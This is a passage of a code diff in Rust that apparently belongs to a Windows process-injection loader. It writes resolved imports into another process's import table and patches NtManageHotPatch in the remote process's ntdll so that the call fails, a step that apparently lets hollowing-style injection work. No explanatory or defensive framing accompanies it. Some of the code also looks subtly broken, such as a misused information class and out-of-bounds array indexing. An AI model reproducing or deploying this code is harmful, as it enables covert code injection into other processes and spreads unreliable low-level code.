+                    WriteProcessMemory(
+                        process_handle,
+                        iat_addr as *mut c_void,
+                        &(addr as u64) as *const _ as *const c_void,
+                        8,
+                        None,
+                    )
+                };
+                if let Err(e) = write_result {
+                    log::error!("Failed to write IAT entry at 0x{:X}: {:?}", iat_addr as usize, e);
+                    return Err(anyhow::anyhow!("Failed to write IAT entry at 0x{:X}: {:?}", iat_addr as usize, e));
+                }
+            } else {
+                log::warn!(
+                    "Failed to resolve function {} (ordinal: {}) from {}, writing 0 to IAT",
+                    import.name,
+                    import.ordinal,
+                    dll_name
+                );
+                let write_result = unsafe {
+                    WriteProcessMemory(
+                        process_handle,
+                        iat_addr as *mut c_void,
+                        &0u64 as *const _ as *const c_void,
+                        8,
+                        None,
+                    )
+                };
+                if let Err(e) = write_result {
+                    log::error!("Failed to write zero to IAT entry at 0x{:X}: {:?}", iat_addr as usize, e);
+                    return Err(anyhow::anyhow!("Failed to write zero to IAT entry at 0x{:X}: {:?}", iat_addr as usize, e));
+                }
+            }
+        } else {
+            log::warn!(
+                "Skipping IAT write: address 0x{:X} out of bounds (image base=0x{:X}, size=0x{:X})",
+                iat_addr as usize,
+                base_addr as usize,
+                image_size
+            );
+        }
+    }
+    log::info!("Imports Win32: {}", unsafe { GetLastError().to_hresult().message() });
+    log::info!("Imports resolved successfully.");
+    Ok(())
+}
+
+pub fn patch_nt_manage_hotpatch64(h_process: HANDLE) -> anyhow::Result<(), anyhow::Error> {
+    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory, FlushInstructionCache};
+    use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, PAGE_EXECUTE_READ};
+    use windows::Win32::System::Threading::GetProcessId;
+    use windows::Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS};
+    use std::ffi::c_void;
+
+    // Get local ntdll base and NtManageHotPatch offset
+    let ntdll = unsafe { GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr())) }?;
+    let ntmanage_addr = unsafe { GetProcAddress(ntdll, PCSTR(b"NtManageHotPatch\0".as_ptr())) };
+    let ntmanage_addr = match ntmanage_addr {
+        Some(ptr) => ptr as *const c_void,
+        None => return Err(anyhow::anyhow!("GetProcAddress(NtManageHotPatch) failed")),
+    };
+    let offset = (ntmanage_addr as usize) - (ntdll.0 as usize);
+    log::debug!("Local NtManageHotPatch offset: 0x{:X}", offset);
+
+    // Get target PID
+    let pid = unsafe { GetProcessId(h_process) };
+    log::debug!("Target process PID: {}", pid);
+
+    // Use NtQueryInformationProcess to get module information
+    #[repr(C)]
+    struct MODULE_INFORMATION {
+        base_of_dll: *mut c_void,
+        size_of_image: u32,
+        entry_point: *mut c_void,
+    }
+    #[repr(C)]
+    struct PROCESS_MODULE_INFORMATION {
+        number_of_modules: u32,
+        modules: [MODULE_INFORMATION; 1],
+    }
+
+    let mut module_info = vec![0u8; 1024 * std::mem::size_of::<MODULE_INFORMATION>()];
+    let mut return_length = 0u32;
+    let status = unsafe {
+        NtQueryInformationProcess(
+            h_process,
+            PROCESSINFOCLASS(11), // ProcessModuleInformation
+            module_info.as_mut_ptr() as *mut c_void,
+            module_info.len() as u32,
+            &mut return_length,
+        )
+    };
+    if !status.is_ok() {
+        return Err(anyhow::anyhow!("NtQueryInformationProcess (ProcessModuleInformation) failed: {:?}", status));
+    }
+
+    let module_info = unsafe { &*(module_info.as_ptr() as *const PROCESS_MODULE_INFORMATION) };
+    let mut remote_ntdll: *mut c_void = std::ptr::null_mut();
+    for i in 0..module_info.number_of_modules as usize {
+        let module = &module_info.modules[i];
+        let mut module_name_buf = [0u8; 256];
+        let len = unsafe {
+            GetModuleBaseNameA(
+                h_process,
+                Some(HMODULE(module.base_of_dll)),
+                &mut module_name_buf,
+            )
+        };
+        if len > 0 {
+            let module_name = String::from_utf8_lossy(&module_name_buf[..len as usize]).to_lowercase();
+            log::debug!("Found module: {} at 0x{:X}", module_name, module.base_of_dll as usize);
+            if module_name.contains("ntdll.dll") {
+                remote_ntdll = module.base_of_dll;
+                break;
+            }
+        }
+    }
+
+    if remote_ntdll.is_null() {
+        return Err(anyhow::anyhow!("Remote ntdll.dll not found"));
+    }
+    let remote_patch_addr = (remote_ntdll as usize + offset) as *mut c_void;
+    log::debug!("Remote NtManageHotPatch address: 0x{:X}", remote_patch_addr as usize);
+
+    // Prepare patch bytes: mov eax, C00000BB (STATUS_NOT_SUPPORTED); ret
+    let patch: [u8; 6] = [0xB8, 0xBB, 0x00, 0x00, 0xC0, 0xC3];
+    let stub_size = 0x20;
+    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+
+    // Change protection to RW
+    let vp = unsafe { VirtualProtectEx(h_process, remote_patch_addr, stub_size, PAGE_READWRITE, &mut old_protect) };
+    if !vp.is_ok() {
+        return Err(anyhow::anyhow!("VirtualProtectEx failed: {:?}", vp));
+    }
+
+    // Read original stub for validation
+    let mut orig_stub = [0u8; 0x20];
+    let mut out_bytes = 0usize;
+    let rp = unsafe { ReadProcessMemory(h_process, remote_patch_addr, orig_stub.as_mut_ptr() as *mut c_void, stub_size, Some(&mut out_bytes)) };
+    if !rp.is_ok() || out_bytes < 6 {
+        return Err(anyhow::anyhow!("ReadProcessMemory failed: {:?}", rp));
+    }
+
+    // Write patch
+    let wp = unsafe { WriteProcessMemory(h_process, remote_patch_addr, patch.as_ptr() as *const c_void, patch.len(), Some(&mut out_bytes)) };
+    if !wp.is_ok() || out_bytes != patch.len() {
+        return Err(anyhow::anyhow!("WriteProcessMemory failed: {:?}", wp));
+    }
+
+    // Restore protection
+    let vp2 = unsafe { VirtualProtectEx(h_process, remote_patch_addr, stub_size, PAGE_EXECUTE_READ, &mut old_protect) };
+    if !vp2.is_ok() {
+        return Err(anyhow::anyhow!("VirtualProtectEx restore failed: {:?}", vp2));
+    }
+
+    // Flush instruction cache
+    unsafe { FlushInstructionCache(h_process, Some(remote_patch_addr), patch.len())? };
+    log::debug!("NtManageHotPatch patched at 0x{:X}", remote_patch_addr as usize);
+    Ok(())
+}
+/// Helper function to convert RVA to file offset
+pub fn rva_to_offset(pe_data: &[u8], rva: usize) -> Option<usize> {
+    let pe = goblin::pe::PE::parse(pe_data).ok()?;
+    for section in pe.sections {
+        let section_start = section.virtual_address as usize;
+        let section_end = section_start + section.size_of_raw_data as usize;
+        if rva >= section_start && rva < section_end {
+            return Some((rva - section_start) + section.pointer_to_raw_data as usize);
+        }
+    }
+    None
 }
